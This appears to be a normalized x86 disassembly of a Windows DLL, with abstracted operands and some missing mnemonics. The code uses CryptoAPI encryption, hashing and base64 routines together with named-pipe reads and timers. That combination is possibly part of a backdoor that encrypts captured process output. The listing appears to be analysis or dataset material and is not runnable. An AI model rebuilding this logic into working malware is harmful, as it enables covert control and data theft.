mov ecx [ rw-data ]
mov [ rw-data ] eax
test ecx ecx
je r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
test eax eax
je r-xdata
push rw-data
call ebx
mov edi eax
test edi edi
je r-xdata
push rw-data
push edi
call esi
push rw-data
push edi
mov [ rw-data ] eax
call esi
push rw-data
push edi
mov [ rw-data ] eax
call esi
push rw-data
push edi
mov [ rw-data ] eax
call esi
push rw-data
push edi
mov [ rw-data ] eax
call esi
push rw-data
push edi
mov [ rw-data ] eax
call esi
push rw-data
push edi
mov [ rw-data ] eax
call esi
mov ecx [ rw-data ]
mov [ rw-data ] eax
test ecx ecx
je r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
test eax eax
je r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
retn
sub_10004490
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
sub esp 0x14
lea eax [ esp + 0x1c ]
push edi
xor edi edi
push eax
push edi
push ecx
push 0x8009
push edx
call [ CryptCreateHash@IAT ]
test eax eax
je r-xdata
mov eax edi
pop edi
add esp 0x14
retn
xor eax eax
mov ecx [ esp + 0x24 ]
mov [ esp + 0x4 ] eax
push esi
mov [ esp + 0xc ] eax
lea edx [ esp + 0x8 ]
mov [ esp + 0x10 ] eax
mov [ esp + 0x8 ] ecx
mov [ esp + 0x14 ] eax
mov [ esp + 0x18 ] eax
push eax
mov eax [ esp + 0x28 ]
push edx
push 0x5
push eax
call [ CryptSetHashParam@IAT ]
mov ecx [ esp + 0x38 ]
mov edx [ esp + 0x34 ]
mov eax [ esp + 0x24 ]
mov esi [ CryptHashData@IAT ]
push edi
push ecx
push edx
push eax
call esi
test eax eax
je r-xdata
mov edx [ esp + 0x24 ]
push edx
call [ CryptDestroyHash@IAT ]
mov eax edi
pop esi
pop edi
add esp 0x14
retn
mov ecx [ esp + 0x40 ]
test ecx ecx
je r-xdata
mov ecx [ esp + 0x24 ]
mov esi [ CryptGetHashParam@IAT ]
lea edx [ esp + 0x20 ]
push 0x0
lea eax [ esp + 0x2c ]
push edx
push eax
push 0x4
push ecx
mov [ esp + 0x34 ] 0x4
call esi
test eax eax
je r-xdata
mov eax [ esp + 0x3c ]
test eax eax
je r-xdata
mov eax [ esp + 0x30 ]
mov ecx [ esp + 0x28 ]
cmp ecx eax
ja r-xdata
push edi
push ecx
mov ecx [ esp + 0x2c ]
push eax
push ecx
call esi
mov ecx [ esp + 0x24 ]
mov [ esp + 0x20 ] eax
mov eax [ esp + 0x2c ]
lea edx [ esp + 0x20 ]
push 0x0
push edx
push eax
push 0x2
push ecx
call esi
test eax eax
je r-xdata
mov edi 0x1
sub_10004590
sub esp 0x5c
push esi
xor esi esi
push esi
push 0x1
push esi
lea eax [ esp + 0x10 ]
push esi
push eax
mov [ esp + 0x1c ] esi
call [ CryptAcquireContextA@IAT ]
test eax eax
je r-xdata
mov eax esi
pop esi
add esp 0x5c
retn
push ebx
push ebp
mov ebp [ esp + 0x70 ]
push edi
lea eax [ ebp + 0xc ]
push eax
mov [ esp + 0x1c ] eax
call sub_10009010
mov edx [ r--data ]
mov ebx eax
mov ecx ebx
mov esi [ esp + 0x74 ]
lea edi [ ebx + 0xc ]
add esp 0x4
mov [ ecx ] edx
mov eax [ r--data ]
mov [ ecx + 0x4 ] eax
mov edx [ r--data ]
mov [ ecx + 0x8 ] edx
mov ecx ebp
mov eax ecx
mov edx [ esp + 0x18 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x74 ]
mov [ ebx + 0x8 ] ebp
mov eax [ esp + 0x10 ]
push ecx
push 0x100
push 0x0
push edx
push ebx
push eax
call [ CryptImportKey@IAT ]
test eax eax
je r-xdata
push ebx
call sub_1000901e
mov eax [ esp + 0x14 ]
add esp 0x4
push 0x0
push eax
call [ CryptReleaseContext@IAT ]
mov eax [ esp + 0x14 ]
pop edi
pop ebp
pop ebx
pop esi
add esp 0x5c
retn
mov esi [ esp + 0x78 ]
or ecx 0xffffffff
mov edi esi
xor eax eax
[ edi ]
not ecx
mov edx [ esp + 0x74 ]
dec ecx
mov edi ecx
push eax
push eax
mov eax [ esp + 0x18 ]
push edi
push esi
lea ecx [ esp + 0x2c ]
push 0x14
push ecx
push 0x8004
push edx
push eax
call sub_10004490
mov eax [ esp + 0x98 ]
push edi
push esi
lea ecx [ esp + 0x48 ]
push 0x14
push ecx
mov ecx [ esp + 0x44 ]
lea edx [ esp + 0x78 ]
push 0x14
push edx
push 0x8004
push eax
push ecx
call sub_10004490
add esp 0x48
mov ecx [ esp + 0x74 ]
lea edx [ esp + 0x1c ]
lea eax [ esp + 0x30 ]
push 0x0
push 0x0
push 0x14
push edx
mov edx [ esp + 0x20 ]
push 0x14
push eax
push 0x8004
push ecx
push edx
call sub_10004490
mov edx [ esp + 0x98 ]
push edi
push esi
lea eax [ esp + 0x5c ]
push 0x14
push eax
mov eax [ esp + 0x44 ]
lea ecx [ esp + 0x8c ]
push 0x14
push ecx
push 0x8004
push edx
push eax
call sub_10004490
mov eax [ esp + 0xc8 ]
add esp 0x48
cmp eax 0x18
jb r-xdata
mov edx [ esp + 0x74 ]
push edx
call [ CryptDestroyKey@IAT ]
mov eax [ esp + 0x7c ]
mov ecx 0x5
lea esi [ esp + 0x44 ]
mov edi eax
[ edi ] [ esi ]
mov ecx [ esp + 0x58 ]
mov [ esp + 0x14 ] 0x1
mov [ eax + 0x14 ] ecx
sub_10004740
sub esp 0x128
xor eax eax
xor ecx ecx
mov [ esp + 0x39 ] eax
xor edx edx
mov [ esp + 0x3d ] eax
mov [ esp + 0x7d ] ecx
mov [ esp + 0x65 ] edx
mov [ esp + 0x41 ] eax
mov [ esp + 0x81 ] ecx
mov [ esp + 0x69 ] edx
mov [ esp + 0x45 ] eax
mov [ esp + 0x85 ] ecx
mov [ esp + 0x6d ] edx
mov [ esp + 0x49 ] eax
mov [ esp + 0x89 ] ecx
mov [ esp + 0x71 ] edx
push ebx
mov [ esp + 0x51 ] ax
mov [ esp + 0x91 ] ecx
mov [ esp + 0x79 ] edx
push ebp
push esi
mov [ esp + 0x5b ] al
mov [ esp + 0x88 ] al
mov [ esp + 0x9d ] cx
mov [ esp + 0x85 ] dx
mov esi [ esp + 0x138 ]
push edi
mov [ esp + 0x61 ] eax
mov [ esp + 0xa3 ] cl
mov [ esp + 0x74 ] cl
push edx
mov edi [ CryptStringToBinaryA@IAT ]
mov [ esp + 0x8f ] dl
mov [ esp + 0x64 ] dl
mov [ esp + 0x69 ] eax
mov [ esp + 0x28 ] dl
mov [ esp + 0x29 ] ecx
push edx
lea edx [ esp + 0x1c ]
mov [ esp + 0x71 ] eax
mov [ esp + 0x31 ] cx
push edx
mov [ esp + 0x79 ] eax
push ecx
push 0x1
mov [ esp + 0x85 ] ax
push ecx
push esi
mov [ esp + 0x64 ] 0x0
mov [ esp + 0x8f ] al
mov [ esp + 0x47 ] cl
call edi
mov eax [ esp + 0x14 ]
mov ebx 0x18
cmp eax ebx
jbe r-xdata
push 0x0
lea eax [ esp + 0x18 ]
push 0x0
lea ecx [ esp + 0x50 ]
push eax
push ecx
push 0x1
push 0x0
push esi
mov [ esp + 0x30 ] ebx
call edi
lea edx [ esp + 0x8c ]
push ebx
push edx
push rw-data
lea eax [ esp + 0x54 ]
push ebx
push eax
call sub_10004590
lea ecx [ esp + 0x88 ]
push ebx
push ecx
push rw-data
lea edx [ esp + 0x68 ]
push ebx
push edx
call sub_10004590
mov esi [ CryptAcquireContextA@IAT ]
add esp 0x28
lea eax [ esp + 0x10 ]
push 0x0
push 0x1
push 0x0
push 0x0
push eax
call esi
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x128
retn
push 0x24
call sub_10009010
mov ebp eax
mov eax [ r--data ]
mov edx ebp
lea esi [ esp + 0x90 ]
lea ebx [ ebp + 0xc ]
add esp 0x4
mov [ edx ] eax
mov ecx [ r--data ]
mov edi ebx
mov [ esp + 0x40 ] ebp
mov [ edx + 0x4 ] ecx
mov eax [ r--data ]
mov ecx 0x6
mov [ edx + 0x8 ] eax
[ edi ] [ esi ]
mov edx [ esp + 0x10 ]
lea ecx [ esp + 0x34 ]
push ecx
push 0x100
push 0x0
push 0x24
push ebp
push edx
call [ CryptImportKey@IAT ]
lea eax [ esp + 0x30 ]
mov ecx 0x6
lea esi [ esp + 0x74 ]
mov edi ebx
push eax
push 0x100
[ edi ] [ esi ]
mov ecx [ esp + 0x18 ]
push 0x0
push 0x24
push ebp
push ecx
call [ CryptImportKey@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x80090016
jne r-xdata
push ebp
call sub_1000901e
mov eax [ esp + 0x38 ]
add esp 0x4
test eax eax
je r-xdata
mov eax [ esp + 0x30 ]
mov esi [ CryptDuplicateKey@IAT ]
lea edx [ esp + 0x1c ]
push edx
push 0x0
push 0x0
push eax
call esi
mov edx [ esp + 0x1c ]
lea ecx [ esp + 0x3c ]
push 0x0
push ecx
push 0x4
push edx
mov [ esp + 0x4c ] 0x1
call [ CryptSetKeyParam@IAT ]
mov ecx [ esp + 0x34 ]
mov edx [ esp + 0x10 ]
lea eax [ esp + 0x2c ]
push eax
push 0x0
push ecx
push 0x8009
push edx
call [ CryptCreateHash@IAT ]
test eax eax
je r-xdata
mov eax [ esp + 0x44 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x128
retn
push 0x8
push 0x1
push 0x0
lea ecx [ esp + 0x1c ]
push 0x0
push ecx
call esi
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
push 0x0
push eax
call [ CryptReleaseContext@IAT ]
push eax
call [ CryptDestroyKey@IAT ]
mov ecx [ esp + 0x1c ]
mov esi [ CryptDestroyKey@IAT ]
push ecx
call esi
mov edx [ esp + 0x30 ]
push edx
call esi
xor eax eax
mov edx [ esp + 0x2c ]
mov [ esp + 0xa4 ] eax
lea ecx [ esp + 0xa4 ]
mov [ esp + 0xa8 ] eax
mov [ esp + 0xa4 ] 0x8004
mov [ esp + 0xac ] eax
mov [ esp + 0xb0 ] eax
push eax
push ecx
push 0x5
push edx
mov [ esp + 0xc4 ] eax
call [ CryptSetHashParam@IAT ]
mov ebx [ esp + 0x140 ]
or ecx 0xffffffff
mov edi ebx
xor eax eax
[ edi ]
not ecx
dec ecx
lea eax [ esp + 0x38 ]
mov [ esp + 0x18 ] ecx
mov ecx [ esp + 0x1c ]
push eax
push 0x0
push 0x0
push ecx
call esi
mov eax [ esp + 0x38 ]
lea edx [ esp + 0x18 ]
push 0x0
push edx
push 0x0
push 0x0
push 0x1
push 0x0
push eax
call [ CryptEncrypt@IAT ]
mov ecx [ esp + 0x38 ]
push ecx
call [ CryptDestroyKey@IAT ]
mov eax [ esp + 0x18 ]
test eax eax
jbe r-xdata
mov eax [ esp + 0x2c ]
push eax
call [ CryptDestroyHash@IAT ]
mov eax [ esp + 0x10 ]
lea edx [ esp + 0x24 ]
push edx
push 0x8
push eax
call [ CryptGenRandom@IAT ]
mov eax [ esp + 0x1c ]
xor ecx ecx
mov [ esp + 0x24 ] ecx
lea edx [ esp + 0x24 ]
push ecx
push edx
push 0x1
push eax
mov [ esp + 0x38 ] ecx
call [ CryptSetKeyParam@IAT ]
mov ecx [ esp + 0x18 ]
push ecx
call sub_10009010
mov ecx [ esp + 0x1c ]
mov ebp eax
mov edx ecx
xor eax eax
mov edi ebp
add esp 0x4
shr ecx 0x2
[ edi ]
mov ecx edx
mov esi ebx
and ecx 0x3
lea edx [ esp + 0x20 ]
[ edi ]
mov edi ebx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov edi ebp
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi ebx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
mov [ esp + 0x20 ] ecx
mov ecx [ esp + 0x18 ]
push ecx
mov ecx [ esp + 0x20 ]
push edx
push ebp
push eax
mov eax [ esp + 0x3c ]
push 0x1
push eax
push ecx
call [ CryptEncrypt@IAT ]
test eax eax
je r-xdata
push ebp
call sub_1000901e
mov ebp [ esp + 0x44 ]
add esp 0x4
mov eax [ esp + 0x20 ]
mov edi 0x48
cmp eax edi
je r-xdata
mov ecx [ esp + 0x2c ]
lea edx [ esp + 0x20 ]
push 0x0
lea eax [ esp + 0x64 ]
push edx
push eax
mov esi 0x14
push 0x2
push ecx
mov [ esp + 0x34 ] esi
call [ CryptGetHashParam@IAT ]
mov edx [ esp + 0x24 ]
mov eax [ esp + 0x28 ]
mov [ esp + 0xcc ] esi
mov [ esp + 0xd0 ] edi
mov ecx 0x5
lea esi [ esp + 0x60 ]
lea edi [ esp + 0xdc ]
mov [ esp + 0xb8 ] 0x1c
mov [ esp + 0xbc ] 0x1
mov [ esp + 0xc0 ] 0x6603
mov [ esp + 0xc4 ] 0x8004
mov [ esp + 0xc8 ] 0x8
mov [ esp + 0xd4 ] edx
mov [ esp + 0xd8 ] eax
[ edi ] [ esi ]
mov ecx 0x12
mov esi ebp
lea edi [ esp + 0xf0 ]
lea edx [ esp + 0xb8 ]
[ edi ] [ esi ]
mov esi [ CryptBinaryToStringA@IAT ]
lea ecx [ esp + 0x14 ]
push ecx
push 0x0
push 0x1
push 0x80
push edx
call esi
mov eax [ esp + 0x14 ]
push eax
call sub_10009010
add esp 0x4
mov [ esp + 0x44 ] eax
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x128
retn
lea ecx [ esp + 0x14 ]
lea edx [ esp + 0xb8 ]
push ecx
push eax
push 0x1
push 0x80
push edx
call esi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x128
retn
sub_10004c60
push ebx
mov ebx [ esp + 0xc ]
push esi
push edi
lea eax [ ebx + ebx + 0x1 ]
push eax
call sub_100096ed
add esp 0x4
xor edi edi
test ebx ebx
mov esi eax
jbe r-xdata
mov [ esi ] 0x0
pop edi
pop esi
pop ebx
retn
push ebp
mov ebp [ esp + 0x14 ]
add ecx 0x57
add ecx 0x30
jmp r-xdata
add ecx 0x57
add ecx 0x30
jmp r-xdata
mov [ esi ] cl
and dl 0xf
inc esi
cmp dl 0x9
movsx ecx dl
jg r-xdata
mov dl [ edi + ebp ]
mov cl dl
shr cl 0x4
cmp cl 0x9
movsx ecx cl
jg r-xdata
pop ebp
mov [ esi ] 0x0
pop edi
pop esi
pop ebx
retn
mov [ esi ] cl
inc esi
inc edi
cmp edi ebx
jb r-xdata
sub_10004cd0
mov eax [ esp + 0x4 ]
push esi
test eax eax
push edi
jne r-xdata
mov ecx [ esp + 0x10 ]
test ecx ecx
je r-xdata
pop edi
xor al al
pop esi
retn
mov edi [ esp + 0x14 ]
push edi
push eax
call sub_10009f60
mov esi eax
add esp 0x8
test esi esi
jne r-xdata
push ecx
push eax
call sub_10009f60
add esp 0x8
test eax eax
jne r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
add esi ecx
cmp [ esi ] 0x20
jne r-xdata
pop edi
xor al al
pop esi
retn
pop edi
xor al al
pop esi
retn
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
mov al [ esi + 0x1 ]
inc esi
cmp al 0x20
je r-xdata
push 0x0
push esi
call sub_10009040
add esp 0x8
push eax
push esi
call sub_10009f60
add esp 0x8
test eax eax
jne r-xdata
push edi
push esi
mov esi [ esp + 0x24 ]
push esi
call sub_10009830
add esp 0xc
mov [ edi + esi ] 0x0
mov al 0x1
pop edi
pop esi
retn
mov edi eax
cmp [ eax - 0x1 ] 0x20
jne r-xdata
pop edi
xor al al
pop esi
retn
mov ecx [ esp + 0x20 ]
sub eax esi
lea edi [ ecx - 0x1 ]
cmp eax edi
jge r-xdata
cmp eax esi
jbe r-xdata
mov cl [ eax - 0x2 ]
dec eax
cmp cl 0x20
je r-xdata
jmp r-xdata
sub_10004d90
mov eax [ esp + 0x4 ]
push ebx
push ebp
push esi
mov cl [ eax ]
mov esi [ esp + 0x14 ]
xor ebx ebx
push edi
test cl cl
mov edi eax
je r-xdata
mov [ esi ] 0x0
pop edi
pop esi
pop ebp
pop ebx
retn
mov ebp 0x4
cmp al 0x3a
jb r-xdata
cmp al 0x2e
je r-xdata
cmp al 0x5b
jb r-xdata
cmp al 0x3f
jbe r-xdata
cmp al 0x2d
jne r-xdata
cmp al 0x40
jne r-xdata
cmp al 0x60
ja r-xdata
cmp ebp [ esp + 0x1c ]
jae r-xdata
mov ecx [ esp + 0x1c ]
inc ebx
inc ebp
cmp ebx ecx
je r-xdata
cmp al 0x5f
jne r-xdata
mov [ esi ] 0x25
xor eax eax
mov al [ edi ]
inc esi
push 0x10
push esi
push eax
call sub_1000a57b
add esp 0xc
add esi 0x2
add ebx 0x3
add ebp 0x3
jmp r-xdata
mov [ esi ] al
inc esi
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov al [ edi ]
cmp al 0x30
jae r-xdata
sub_10004e20
push esi
mov esi ecx
lea ecx [ esi + 0xcf8 ]
call sub_10008230
push 0x4
push 0x1000
push 0x100000
push 0x0
mov [ esi ] r--data
mov [ esi + 0xf78 ] 0x1
call [ VirtualAlloc@IAT ]
mov [ esi + 0xe54 ] eax
mov [ esi + 0xcf0 ] eax
add eax 0x80000
mov [ esi + 0x28 ] 0x0
mov [ esi + 0xcf4 ] eax
or eax 0xffffffff
mov [ esi + 0x4 ] eax
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] eax
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] eax
mov eax esi
pop esi
retn
sub_10004eb0
push 0xffffffff
push sub_1001184e
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
push edi
mov [ esp + 0x8 ] esi
mov [ esi ] r--data
mov eax [ esi + 0xe54 ]
mov [ esp + 0x14 ] 0x0
test eax eax
je r-xdata
mov eax [ esi + 0xe50 ]
cmp eax 0x1
je r-xdata
push 0x8000
push 0x100000
push eax
call [ VirtualFree@IAT ]
call sub_10001070
test eax eax
jne r-xdata
mov eax [ esi + 0x18 ]
cmp eax 0xffffffff
je r-xdata
push eax
call edi
mov eax [ esi + 0x14 ]
mov edi [ CloseHandle@IAT ]
cmp eax 0xffffffff
je r-xdata
mov eax [ esi + 0xc ]
cmp eax 0xffffffff
je r-xdata
push eax
call edi
mov eax [ esi + 0x10 ]
cmp eax 0xffffffff
je r-xdata
push eax
call edi
lea ecx [ esi + 0xcf8 ]
mov [ esp + 0x14 ] 0xffffffff
call sub_10008280
mov ecx [ esp + 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
push eax
call edi
sub_10004f70
sub esp 0x1c
push ebx
push ebp
push esi
xor ebx ebx
push edi
push ebx
push ebx
mov esi ecx
push ebx
mov [ esp + 0x20 ] ebx
mov [ esp + 0x1c ] ebx
call [ CreateWaitableTimerA@IAT ]
mov edi eax
cmp edi 0xffffffff
mov [ esp + 0x20 ] edi
je r-xdata
jmp r-xdata
lea ebp [ esi + 0x1c ]
push ebp
call [ GetSystemTimeAsFileTime@IAT ]
mov ecx [ ebp ]
push ebx
add ecx 0x2faf080
push ebx
push ebx
lea edx [ esp + 0x30 ]
mov [ ebp ] ecx
mov eax ecx
mov ecx [ ebp + 0x4 ]
push ebx
push edx
push edi
mov [ esp + 0x3c ] eax
mov [ esp + 0x40 ] ecx
call [ SetWaitableTimer@IAT ]
test eax eax
je r-xdata
mov esi [ esi + 0x4 ]
cmp esi 0xffffffff
je r-xdata
lea ebx [ esi + 0xcf8 ]
push 0x1
mov ecx ebx
call sub_10008650
mov ecx ebx
call sub_10008460
test eax eax
je r-xdata
push edi
call [ CloseHandle@IAT ]
push esi
call [ CloseHandle@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x1c
retn
mov eax [ esi + 0xe50 ]
test eax eax
jl r-xdata
mov eax [ esi + 0xcf4 ]
lea edx [ esp + 0x1c ]
push edx
push 0x80000
push eax
mov ecx ebx
call sub_10008680
test eax eax
mov [ esp + 0x18 ] eax
je r-xdata
cmp eax 0x1
jle r-xdata
mov eax [ esp + 0x1c ]
test eax eax
je r-xdata
push 0x40
call sub_10001000
mov eax [ esi + 0xf78 ]
add esp 0x4
push eax
lea ecx [ eax + 0x1 ]
push rw-data
push ebx
mov [ esi + 0xf78 ] ecx
call sub_100088c0
add esp 0xc
cmp eax 0x2
jne r-xdata
mov eax [ esi + 0xe50 ]
sub eax 0x3
je r-xdata
mov ecx [ esi + 0xcf4 ]
push ecx
mov ecx esi
call sub_10005920
mov [ esp + 0x18 ] eax
jmp r-xdata
mov eax [ esi + 0xf78 ]
lea ecx [ eax + 0x1 ]
mov [ esi + 0xf78 ] ecx
mov ecx [ esi + 0x24 ]
lea edx [ ecx + 0x434 ]
add ecx 0x454
push edx
push ecx
push rw-data
push eax
push rw-data
push ebx
call sub_100088c0
add esp 0x18
jmp r-xdata
mov ecx [ esi + 0xcf4 ]
mov edx [ esi + 0x14 ]
push 0x0
lea eax [ esp + 0x18 ]
push 0x0
push eax
push 0x400
push ecx
push edx
call [ PeekNamedPipe@IAT ]
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
dec eax
jne r-xdata
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
push 0x493e0
push edi
call [ WaitForSingleObject@IAT ]
test eax eax
je r-xdata
mov edx [ esi + 0xcf4 ]
lea ecx [ esp + 0x10 ]
push 0x0
push ecx
push eax
mov eax [ esi + 0x14 ]
push edx
push eax
call [ ReadFile@IAT ]
mov eax [ esi + 0xcf4 ]
lea ecx [ esp + 0x14 ]
push ecx
mov ecx [ esp + 0x14 ]
lea edx [ eax + 0x800 ]
push 0x800
push edx
push ecx
push eax
call sub_10001340
add esp 0x14
test eax eax
je r-xdata
mov eax [ esi + 0xcf4 ]
mov ecx [ esi + 0x4 ]
lea edx [ esp + 0x10 ]
push 0x0
push edx
push 0x400
push eax
push ecx
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
push rw-data
mov ecx ebx
call sub_100082c0
mov ecx ebx
call sub_10008810
mov eax [ rw-data ]
test eax eax
jne r-xdata
push ebp
call [ GetSystemTimeAsFileTime@IAT ]
mov ecx [ ebp ]
push 0x0
add ecx 0x2faf080
push 0x0
push 0x0
lea eax [ esp + 0x30 ]
mov [ ebp ] ecx
mov edx [ ebp + 0x4 ]
push 0x0
push eax
push edi
mov [ esp + 0x3c ] ecx
mov [ esp + 0x40 ] edx
call [ SetWaitableTimer@IAT ]
push rw-data
mov ecx ebx
call sub_100082c0
jmp r-xdata
cmp eax 0x102
je r-xdata
mov edx [ esi + 0xcf4 ]
mov eax [ esp + 0x14 ]
mov [ eax + edx + 0x800 ] 0x0
mov eax [ esi + 0xcf4 ]
lea ecx [ eax + 0x800 ]
add eax 0x1000
push ecx
push rw-data
push eax
call sub_1000a135
mov edx [ esi + 0xf78 ]
mov edi [ esi + 0xcf4 ]
add esp 0xc
add edi 0x1000
lea eax [ edx + 0x1 ]
or ecx 0xffffffff
mov [ esi + 0xf78 ] eax
xor eax eax
push edi
[ edi ]
not ecx
dec ecx
push ecx
push edx
push rw-data
push ebx
call sub_100088c0
add esp 0x14
mov eax [ esi + 0xcf4 ]
lea ecx [ esp + 0x1c ]
push ecx
mov ecx [ esp + 0x14 ]
lea edx [ eax + 0x800 ]
push 0x800
push edx
push ecx
push eax
call sub_10001340
mov eax [ esi + 0xcf4 ]
mov edx [ esp + 0x30 ]
add esp 0x14
mov [ esp + 0x14 ] edx
lea ecx [ eax + 0x800 ]
add eax 0x1000
push ecx
push rw-data
push eax
call sub_1000a135
mov edx [ esi + 0xf78 ]
add esp 0xc
or ecx 0xffffffff
lea eax [ edx + 0x1 ]
mov [ esi + 0xf78 ] eax
mov eax [ esi + 0xcf4 ]
lea edi [ eax + 0x1000 ]
xor eax eax
push edi
[ edi ]
not ecx
dec ecx
push ecx
push edx
push rw-data
push ebx
call sub_100088c0
mov ecx [ esp + 0x24 ]
mov eax [ esi + 0x8 ]
add esp 0x14
sub eax ecx
mov [ esi + 0x8 ] eax
jne r-xdata
mov edx [ esi + 0x4 ]
mov [ esp + 0x18 ] eax
push edx
call [ CloseHandle@IAT ]
mov [ esi + 0x4 ] 0xffffffff
mov edx [ esi + 0xcf4 ]
lea ecx [ esp + 0x1c ]
push ecx
push 0x80000
push edx
mov ecx ebx
call sub_10008680
test eax eax
mov [ esp + 0x18 ] eax
je r-xdata
jmp r-xdata
mov edi [ esp + 0x20 ]
mov edx [ esi + 0x4 ]
mov [ esp + 0x18 ] 0x0
push edx
call [ CloseHandle@IAT ]
mov edi [ esp + 0x20 ]
mov [ esi + 0x4 ] 0xffffffff
jmp r-xdata
jmp r-xdata
sub_10005350
push ecx
mov edx [ esp + 0xc ]
push ebx
xor ebx ebx
push ebp
push esi
cmp edx ebx
push edi
mov ebp ecx
mov [ esp + 0x10 ] ebx
jne r-xdata
lea edi [ ebp + 0xef8 ]
mov ecx 0x20
xor eax eax
mov esi [ esp + 0x18 ]
[ edi ]
mov edi [ ebp + 0xcf0 ]
lea ecx [ edx + 0x1 ]
mov eax ecx
mov [ esp + 0x1c ] edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
test edx edx
[ edi ] [ esi ]
jbe r-xdata
mov eax [ esp + 0x18 ]
push eax
call [ lstrlenA@IAT ]
mov edx eax
mov eax [ esp + 0x10 ]
pop edi
pop esi
pop ebp
inc eax
pop ebx
pop ecx
retn 0xc
mov dl [ esp + 0x20 ]
lea esi [ ebp + 0xef8 ]
mov cl [ eax + edi ]
cmp cl dl
je r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
je r-xdata
cmp cl 0xd
jne r-xdata
mov ecx [ ebp + 0xcf0 ]
mov ebx 0x1
add ecx eax
mov [ esi ] ecx
mov ecx [ esp + 0x1c ]
inc eax
cmp eax ecx
jb r-xdata
mov edi [ esp + 0x10 ]
mov ecx [ ebp + 0xcf0 ]
xor ebx ebx
inc edi
mov [ ecx + eax ] bl
mov [ esp + 0x10 ] edi
add esi 0x4
mov edi [ esp + 0x18 ]
cmp [ eax + edi ] dl
je r-xdata
mov edx [ esp + 0x10 ]
pop edi
pop esi
pop ebp
lea eax [ edx + 0x1 ]
pop ebx
pop ecx
retn 0xc
sub_10005420
mov eax 0x201c
call sub_1000a610
push ebx
push ebp
mov ebp ecx
push esi
mov ecx [ esp + 0x202c ]
push edi
mov eax [ ebp + 0x24 ]
push ecx
xor esi esi
lea edx [ eax + 0x104 ]
add eax 0x4
push edx
push eax
lea eax [ esp + 0x38 ]
push rw-data
push eax
mov [ esp + 0x30 ] esi
mov [ esp + 0x38 ] esi
call sub_1000a135
lea edi [ esp + 0x40 ]
or ecx 0xffffffff
xor eax eax
add esp 0x14
[ edi ]
not ecx
dec ecx
lea edx [ esp + 0x24 ]
mov [ esp + 0x14 ] ecx
lea ecx [ esp + 0x2c ]
push ecx
push edx
lea eax [ esp + 0x1c ]
push esi
push eax
push rw-data
mov ecx ebp
call sub_100056d0
mov ebx eax
cmp ebx esi
mov [ esp + 0x18 ] ebx
jne r-xdata
mov ecx [ esp + 0x14 ]
mov [ ebx + ecx ] 0x0
mov edx [ esp + 0x14 ]
push edx
push ebx
call sub_10002860
add esp 0x8
mov [ esp + 0x28 ] eax
push 0xffffffff
push rw-data
push esi
push rw-data
push esi
push rw-data
push eax
call sub_100016f0
mov esi eax
add esp 0x1c
xor edi edi
mov [ esp + 0x10 ] esi
test esi esi
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x201c
retn 0x4
mov eax [ esp + 0x28 ]
push eax
call sub_100031a0
lea ecx [ ebp + 0x470 ]
lea edx [ ebp + 0x70 ]
push ecx
push edx
call sub_10004740
mov esi eax
or ecx 0xffffffff
mov edi esi
xor eax eax
add esp 0xc
mov edx eax
[ edi ]
not ecx
dec ecx
mov edi eax
mov [ esp + 0x14 ] ecx
je r-xdata
jmp r-xdata
lea eax [ esp + 0x2c ]
add ebp 0x4f0
push eax
push ebp
push rw-data
push ebx
mov [ esp + edi + 0x3c ] 0x0
call sub_1000a135
mov edi ebx
or ecx 0xffffffff
xor eax eax
add esp 0x10
[ edi ]
not ecx
sub edi ecx
mov eax [ esp + 0x24 ]
mov edx ecx
mov esi edi
mov edi ebp
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
test eax eax
[ edi ] [ esi ]
je r-xdata
mov al [ esi + edx ]
cmp al 0xd
je r-xdata
push 0xffffffff
push rw-data
push 0x0
push rw-data
push esi
call sub_100016f0
add esp 0x14
test eax eax
je r-xdata
mov eax [ esp + 0x1c ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x201c
retn 0x4
push eax
call sub_1000901e
add esp 0x4
inc edx
cmp edx ecx
jb r-xdata
cmp al 0xa
je r-xdata
